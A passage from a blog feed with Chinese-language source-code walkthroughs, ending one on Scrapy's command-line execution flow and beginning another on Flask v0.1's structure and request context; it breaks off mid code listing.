settings_module_path:</span><br><span class="line">       settings.setmodule(settings_module_path, priority=<span class="string">'project'</span>)</span><br><span class="line"><span class="comment">#以下都为一些更新操作，setdict函数里面是一些set_update函数</span></span><br><span class="line">   <span class="comment"># <span class="doctag">XXX:</span> remove this hack</span></span><br><span class="line">   pickled_settings = os.environ.get(<span class="string">"SCRAPY_PICKLED_SETTINGS_TO_OVERRIDE"</span>)</span><br><span class="line">   <span class="keyword">if</span> pickled_settings:</span><br><span class="line">       settings.setdict(pickle.loads(pickled_settings), priority=<span class="string">'project'</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># <span class="doctag">XXX:</span> deprecate and remove this functionality</span></span><br><span class="line">   env_overrides = &#123;k[<span class="number">7</span>:]: v <span class="keyword">for</span> k, v <span class="keyword">in</span> os.environ.items() <span class="keyword">if</span></span><br><span class="line">                    k.startswith(<span class="string">'SCRAPY_'</span>)&#125;</span><br><span class="line">   <span class="keyword">if</span> env_overrides:</span><br><span class="line">       settings.setdict(env_overrides, priority=<span class="string">'project'</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> settings</span><br></pre></td></tr></table></figure><p>至此，<code>get_project_settings()</code>该函数结束，如函数名字一样，最后返回项目配置。回到最初<code>cmdline.py</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#容差兼容性检测</span></span><br><span class="line"> check_deprecated_settings(settings)</span><br><span class="line"><span class="comment">#兼容</span></span><br><span class="line">   <span class="comment"># --- backwards compatibility for scrapy.conf.settings singleton ---</span></span><br><span class="line">   <span class="keyword">import</span> warnings</span><br><span class="line">   <span class="keyword">from</span> scrapy.exceptions <span class="keyword">import</span> ScrapyDeprecationWarning</span><br><span class="line">   <span class="keyword">with</span> warnings.catch_warnings():</span><br><span class="line">       warnings.simplefilter(<span class="string">"ignore"</span>, ScrapyDeprecationWarning)</span><br><span class="line">       <span class="keyword">from</span> scrapy <span class="keyword">import</span> conf</span><br><span class="line">       conf.settings = settings</span><br><span class="line">   <span class="comment"># ------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><p>此处执行<code>check_deprecated_settings</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_deprecated_settings</span><span class="params">(settings)</span>:</span></span><br><span class="line">    deprecated = [x <span class="keyword">for</span> x <span class="keyword">in</span> DEPRECATED_SETTINGS <span class="keyword">if</span> settings[x[<span class="number">0</span>]] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>]</span><br><span class="line">    <span class="keyword">if</span> deprecated:</span><br><span class="line">        msg = <span class="string">"You are using the following settings which are deprecated or obsolete"</span></span><br><span class="line">        msg += <span class="string">" (ask scrapy-users@googlegroups.com for alternatives):"</span></span><br><span class="line">        msg = msg + <span class="string">"\n    "</span> + <span class="string">"\n    "</span>.join(<span class="string">"%s: %s"</span> % x <span class="keyword">for</span> x <span class="keyword">in</span> deprecated)</span><br><span class="line">        warnings.warn(msg, ScrapyDeprecationWarning)</span><br></pre></td></tr></table></figure><p>做一些容差性检测。接下来<code>cmdline.py</code>函数<code>execute()</code>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#是否环境在项目中</span></span><br><span class="line">inproject = inside_project()</span><br><span class="line">   <span class="comment">#做字典</span></span><br><span class="line">   cmds = _get_commands_dict(settings, inproject)</span><br></pre></td></tr></table></figure><p><code>inside_project</code>函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inside_project</span><span class="params">()</span>:</span></span><br><span class="line">    scrapy_module = os.environ.get(<span class="string">'SCRAPY_SETTINGS_MODULE'</span>)</span><br><span class="line">    <span class="keyword">if</span> scrapy_module <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            import_module(scrapy_module)</span><br><span class="line">        <span class="keyword">except</span> ImportError <span class="keyword">as</span> exc:</span><br><span class="line">            warnings.warn(<span class="string">"Cannot import scrapy settings module %s: %s"</span> % (scrapy_module, exc))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> bool(closest_scrapy_cfg())</span><br></pre></td></tr></table></figure><p>检测是否有<code>SCRAPY_SETTINGS_MODULE</code>，这是前面有的啊，如何当真没有则执行<code>closest_scrapy_cfg()</code>,该函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closest_scrapy_cfg</span><span class="params">(path=<span class="string">'.'</span>, prevpath=None)</span>:</span></span><br><span class="line">    <span class="string">"""Return the path to the closest scrapy.cfg file by traversing the current</span></span><br><span class="line"><span class="string">    directory and its parents</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> path == prevpath:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    path = os.path.abspath(path)</span><br><span class="line">    cfgfile = os.path.join(path, <span class="string">'scrapy.cfg'</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(cfgfile):</span><br><span class="line">        <span class="keyword">return</span> cfgfile</span><br><span class="line">    <span class="keyword">return</span> closest_scrapy_cfg(os.path.dirname(path), path)</span><br></pre></td></tr></table></figure><p>循环查找<code>scrapy.cfg</code>,如何有就返回，同时上面代码<code>bool</code>返回真。如函数名字所示，该<code>inside_project</code>函数检测环境是否于项目中。随后执行<code>cmds = _get_commands_dict(settings, inproject)</code>,涉及如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_iter_command_classes</span><span class="params">(module_name)</span>:</span></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> add `name` attribute to commands and and merge this function with</span></span><br><span class="line">    <span class="comment"># scrapy.utils.spider.iter_spider_classes</span></span><br><span class="line">    <span class="keyword">for</span> module <span class="keyword">in</span> walk_modules(module_name):</span><br><span class="line">        <span class="keyword">for</span> obj <span class="keyword">in</span> vars(module).values():</span><br><span class="line">            <span class="keyword">if</span> inspect.isclass(obj) <span class="keyword">and</span> \</span><br><span class="line">                    issubclass(obj, ScrapyCommand) <span class="keyword">and</span> \</span><br><span class="line">                    obj.__module__ == module.__name__ <span class="keyword">and</span> \</span><br><span class="line">                    <span class="keyword">not</span> obj == ScrapyCommand:</span><br><span class="line">                <span class="keyword">yield</span> obj</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_commands_from_module</span><span class="params">(module, inproject)</span>:</span></span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    <span class="comment">#将module也即commands文件夹文件带入</span></span><br><span class="line">    <span class="keyword">for</span> cmd <span class="keyword">in</span> _iter_command_classes(module):</span><br><span class="line">        <span class="keyword">if</span> inproject <span class="keyword">or</span> <span class="keyword">not</span> cmd.requires_project:</span><br><span class="line">            cmdname = cmd.__module__.split(<span class="string">'.'</span>)[<span class="number">-1</span>]</span><br><span class="line">            d[cmdname] = cmd()</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_commands_from_entry_points</span><span class="params">(inproject, group=<span class="string">'scrapy.commands'</span>)</span>:</span></span><br><span class="line">    cmds = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> entry_point <span class="keyword">in</span> pkg_resources.iter_entry_points(group):</span><br><span class="line">        obj = entry_point.load()</span><br><span class="line">        <span class="keyword">if</span> inspect.isclass(obj):</span><br><span class="line">            cmds[entry_point.name] = obj()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"Invalid entry point %s"</span> % entry_point.name)</span><br><span class="line">    <span class="keyword">return</span> cmds</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_commands_dict</span><span class="params">(settings, inproject)</span>:</span></span><br><span class="line">   <span class="comment">#将commands文件夹带入该函数中</span></span><br><span class="line">    cmds = _get_commands_from_module(<span class="string">'scrapy.commands'</span>, inproject)</span><br><span class="line">    cmds.update(_get_commands_from_entry_points(inproject))</span><br><span class="line">    cmds_module = settings[<span class="string">'COMMANDS_MODULE'</span>]</span><br><span class="line">    <span class="keyword">if</span> cmds_module:</span><br><span class="line">        cmds.update(_get_commands_from_module(cmds_module, inproject))</span><br><span class="line">    <span class="keyword">return</span> cmds</span><br><span class="line">  <span class="comment">#最后返回一个字典</span></span><br></pre></td></tr></table></figure><p>将该函数返回结果进行打印，如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'bench'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.bench</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d597f98&gt;, <span class="string">'check'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.check</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d5975c0&gt;, <span class="string">'crawl'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.crawl</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d57ef98&gt;, <span class="string">'edit'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.edit</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d57ee48&gt;, <span class="string">'fetch'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.fetch</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d57eb70&gt;, <span class="string">'genspider'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.genspider</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d57eb38&gt;, <span class="string">'list'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.list</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d57edd8&gt;, <span class="string">'parse'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.parse</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d5b1080&gt;, <span class="string">'runspider'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.runspider</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d5832e8&gt;, <span class="string">'settings'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.settings</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d5833c8&gt;, <span class="string">'shell'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.shell</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d5b54a8&gt;, <span class="string">'startproject'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.startproject</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d5b5438&gt;, <span class="string">'version'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.version</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d5b5470&gt;, <span class="string">'view'</span>: &lt;scrapy<span class="selector-class">.commands</span><span class="selector-class">.view</span><span class="selector-class">.Command</span> <span class="selector-tag">object</span> at <span class="number">0</span>x180d5b55c0&gt;&#125;</span><br></pre></td></tr></table></figure><p>这些均为commands文件夹下文件，可以发现这些个文件几乎都存在run函数，都是可以执行的命令，有没有发现一个特别的<code>crawl</code>呢。继续</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#得到你输入的命令</span></span><br><span class="line"> cmdname = _pop_command_name(argv)</span><br><span class="line">   parser = optparse.OptionParser(formatter=optparse.TitledHelpFormatter(), \</span><br><span class="line">       conflict_handler=<span class="string">'resolve'</span>)</span><br><span class="line">   <span class="keyword">if</span> <span class="keyword">not</span> cmdname:</span><br><span class="line">       _print_commands(settings, inproject)</span><br><span class="line">       sys.exit(<span class="number">0</span>)</span><br><span class="line">     <span class="comment">#字典中寻找，找到对应的命令</span></span><br><span class="line">   <span class="keyword">elif</span> cmdname <span class="keyword">not</span> <span class="keyword">in</span> cmds:</span><br><span class="line">       _print_unknown_command(settings, cmdname, inproject)</span><br><span class="line">       sys.exit(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#找到了，还有一些处理</span></span><br><span class="line">   cmd = cmds[cmdname]</span><br><span class="line">   parser.usage = <span class="string">"scrapy %s %s"</span> % (cmdname, cmd.syntax())</span><br><span class="line">   parser.description = cmd.long_desc()</span><br><span class="line">   settings.setdict(cmd.default_settings, priority=<span class="string">'command'</span>)</span><br><span class="line">   cmd.settings = settings</span><br><span class="line">   cmd.add_options(parser)</span><br><span class="line">   opts, args = parser.parse_args(args=argv[<span class="number">1</span>:])</span><br><span class="line">   _run_print_help(parser, cmd.process_options, args, opts)</span><br><span class="line"><span class="comment">#创建CrawlerProcess实例</span></span><br><span class="line">   cmd.crawler_process = CrawlerProcess(settings)</span><br><span class="line">   <span class="comment">#将对应的命令执行，这里是crawl</span></span><br><span class="line">   _run_print_help(parser, _run_command, cmd, args, opts)</span><br><span class="line">   sys.exit(cmd.exitcode)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_run_command</span><span class="params">(cmd, args, opts)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> opts.profile:</span><br><span class="line">        _run_command_profiled(cmd, args, opts)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd.run(args, opts)</span><br></pre></td></tr></table></figure><h1 id="0x02-小结"><a href="#0x02-小结" class="headerlink" title="0x02.小结"></a>0x02.小结</h1><p>这里一路下来就是，得到配置文件，照着输入的命令于commands文件夹中寻找对应命令并执行。这里还没有得到太多细节，下次再聊。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h1&gt;&lt;p&gt;相信大家都用过python的scrapy框架写给爬虫。然后就想看看这个框架的简单执行流程。&lt;/p&gt;
&lt;h1 id=&quot;0x01-大体架构&quot;&gt;&lt;a href=&quot;#0x01-大体架构&quot; class=&quot;headerlink&quot; title=&quot;0x01.大体架构&quot;&gt;&lt;/a&gt;0x01.大体架构&lt;/h1&gt;&lt;p&gt;官方架构图如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://myndtt.github.io/images/58.png&quot; alt=&quot;architecture&quot;&gt;&lt;/p&gt;
&lt;p&gt;图大体架构很清晰，实际以例子来看看，一般我们的爬虫以如下代码开始运行(命令行是一样的)&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; cmdline&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmdline.execute(&lt;span class=&quot;string&quot;&gt;&quot;scrapy crawl xxx&quot;&lt;/span&gt;.split())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://myndtt.github.io/tags/python/"/>
    
      <category term="scrapy" scheme="https://myndtt.github.io/tags/scrapy/"/>
    
  </entry>
  
  <entry>
    <title>flask v0.1源码简单分析</title>
    <link href="https://myndtt.github.io/2018/01/22/flask-v0-1%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://myndtt.github.io/2018/01/22/flask-v0-1源码简单分析/</id>
    <published>2018-01-22T05:50:17.000Z</published>
    <updated>2019-09-22T05:04:46.309Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h2><p>想学习python的flask，看了《FlaskWeb开发：基于Python的Web应用开发实战》这本书，觉得很OK👌。之前彭师兄分析过flask v0.1的源码，听说代码不长，加之网上解释甚多，所以自己也想看看，就其本身，本文无意义，有错误更是可能，只是记录而已。</p><h2 id="0x01-获取"><a href="#0x01-获取" class="headerlink" title="0x01.获取"></a>0x01.获取</h2><p>第一步获取<code>git clone https://github.com/pallets/flask.git</code>,这是最新版本的</p><p>第二步 <code>git tag</code>看版本</p><p>第三步<code>git reset --hard xx</code>回退到对应版本</p><p>最后是这样</p><p><img src="http://myndtt.github.io/images/54.png" alt="54"></p><p>主要内容在flask.py文件里面</p><a id="more"></a><h2 id="0x02-简要分析"><a href="#0x02-简要分析" class="headerlink" title="0x02.简要分析"></a>0x02.简要分析</h2><h3 id="1-包"><a href="#1-包" class="headerlink" title="1.包"></a>1.包</h3><p>flask.py导入的包情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> with_statement</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> local</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, PackageLoader, FileSystemLoader</span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> Request <span class="keyword">as</span> RequestBase, Response <span class="keyword">as</span> ResponseBase, \</span><br><span class="line">     LocalStack, LocalProxy, create_environ, cached_property, \</span><br><span class="line">     SharedDataMiddleware</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> Map, Rule</span><br><span class="line"><span class="keyword">from</span> werkzeug.exceptions <span class="keyword">import</span> HTTPException, InternalServerError</span><br><span class="line"><span class="keyword">from</span> werkzeug.contrib.securecookie <span class="keyword">import</span> SecureCookie</span><br><span class="line"></span><br><span class="line"><span class="comment"># utilities we import from Werkzeug and Jinja2 that are unused</span></span><br><span class="line"><span class="comment"># in the module but are exported as public interface.</span></span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> abort, redirect</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Markup, escape</span><br></pre></td></tr></table></figure><p>Werkzeug是<a href="https://baike.baidu.com/item/Python" target="_blank" rel="noopener">Python</a>的<a href="https://baike.baidu.com/item/WSGI" target="_blank" rel="noopener">WSGI</a>规范的实用函数库，而对于WSGI,廖先生解释的很好啊<a href="https://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001386832689740b04430a98f614b6da89da2157ea3efe2000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001386832689740b04430a98f614b6da89da2157ea3efe2000</a></p><p>盗一张简书的图</p><p><img src="https://upload-images.jianshu.io/upload_images/1563354-26e27df8f32e9d55.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/545" alt="55"></p><p>而jinja2是flask其默认的页面模版，其格式有点像最初的将java代码写在jsp页面中…</p><h3 id="2-上下文"><a href="#2-上下文" class="headerlink" title="2.上下文"></a>2.上下文</h3><p>flask.py最下面是这几行，要看懂flask需要了解其上下文机制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_request_ctx_stack = LocalStack()<span class="comment">#建立request栈</span></span><br><span class="line">current_app = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.app)<span class="comment">#栈当前app</span></span><br><span class="line">request = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.request)<span class="comment">#栈当前request</span></span><br><span class="line">session = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.session)<span class="comment">#栈当前session</span></span><br><span class="line">g = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.g)<span class="comment">#当栈前g</span></span><br></pre></td></tr></table></figure><p>书中有提到</p><p><img src="http://myndtt.github.io/images/55.png" alt="55"></p><p>对于上下文的解释更有<a href="https://blog.tonyseek.com/post/the-context-mechanism-of-flask/" target="_blank" rel="noopener">https://blog.tonyseek.com/post/the-context-mechanism-of-flask/</a></p><p>解释的很好。</p><h3 id="3-简单流程"><a href="#3-简单流程" class="headerlink" title="3.简单流程"></a>3.简单流程</h3><p>下面一大串其实主要为了解释上门那张图</p><h4 id="一-app-Flask-name"><a href="#一-app-Flask-name" class="headerlink" title="一.app=Flask(__name__)"></a>一.<code>app=Flask(__name__)</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#程序入口 建立app实例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flask</span><span class="params">(object)</span>:</span></span><br></pre></td></tr></table></figure><p>并且其中初始化一些东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">self.template_context_processors = [_default_template_ctx_processor]</span><br><span class="line"></span><br><span class="line">        self.url_map = Map()<span class="comment">#URL endpoint function 对应的map</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.static_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.url_map.add(Rule(self.static_path + <span class="string">'/&lt;filename&gt;'</span>,</span><br><span class="line">                                  build_only=<span class="literal">True</span>, endpoint=<span class="string">'static'</span>))</span><br><span class="line">            <span class="keyword">if</span> pkg_resources <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                target = (self.package_name, <span class="string">'static'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                target = os.path.join(self.root_path, <span class="string">'static'</span>)</span><br><span class="line">            self.wsgi_app = SharedDataMiddleware(self.wsgi_app, &#123;<span class="comment">#静态</span></span><br><span class="line">                self.static_path: target</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#: the Jinja2 environment.  It is created from the</span></span><br><span class="line">        <span class="comment">#: :attr:`jinja_options` and the loader that is returned</span></span><br><span class="line">        <span class="comment">#: by the :meth:`create_jinja_loader` function.</span></span><br><span class="line">        self.jinja_env = Environment(loader=self.create_jinja_loader(),</span><br><span class="line">                                     **self.jinja_options)</span><br><span class="line">        self.jinja_env.globals.update(</span><br><span class="line">            url_for=url_for,</span><br><span class="line">            get_flashed_messages=get_flashed_messages</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p>这里还是很关键的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flask应用使用werkzeug库中的Map类和Rule类来处理URL的模式匹配，每一个URL模式对应一个Rule实例，这些Rule实例最终会作为参数传递给Map类构造包含所有URL模式的一个“地图”。</span><br><span class="line">Flask使用SharedDataMiddleware来对静态内容的访问支持，也即是static目录下的资源可以被外部，</span><br></pre></td></tr></table></figure><p>flask的route设计思路，这篇足以<a href="https://segmentfault.com/a/1190000004213652" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004213652</a></p><h4 id="二-app-run"><a href="#二-app-run" class="headerlink" title="二.app.run()"></a>二.<code>app.run()</code></h4><p>开始运行flask类下的<code>run()</code>函数,run函数最后一句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> run_simple(host, port, self, **options)<span class="comment">#开始运行,这里的run_simple是werkzeug里面的</span></span><br></pre></td></tr></table></figure><p>在对应·的<code>/lib/python版本/site-packes/werkzeug/serving.py</code>文件中可以找到该函数,该函数属于</p><p><code>class ForkingWSGIServer(ForkingMixIn, BaseWSGIServer):</code>类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_simple</span><span class="params">(hostname, port, application, use_reloader=False,</span></span></span><br><span class="line"><span class="function"><span class="params">               use_debugger=False, use_evalex=True,</span></span></span><br><span class="line"><span class="function"><span class="params">               extra_files=None, reloader_interval=<span class="number">1</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">               reloader_type=<span class="string">'auto'</span>, threaded=False,</span></span></span><br><span class="line"><span class="function"><span class="params">               processes=<span class="number">1</span>, request_handler=None, static_files=None,</span></span></span><br><span class="line"><span class="function"><span class="params">               passthrough_errors=False, ssl_context=None)</span>:</span></span><br><span class="line">    <span class="string">"""Start a WSGI application. Optional features include a reloader,</span></span><br><span class="line"><span class="string">    multithreading and fork support.</span></span><br></pre></td></tr></table></figure><p>该函数下同时执行<code>inner()</code>函数,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 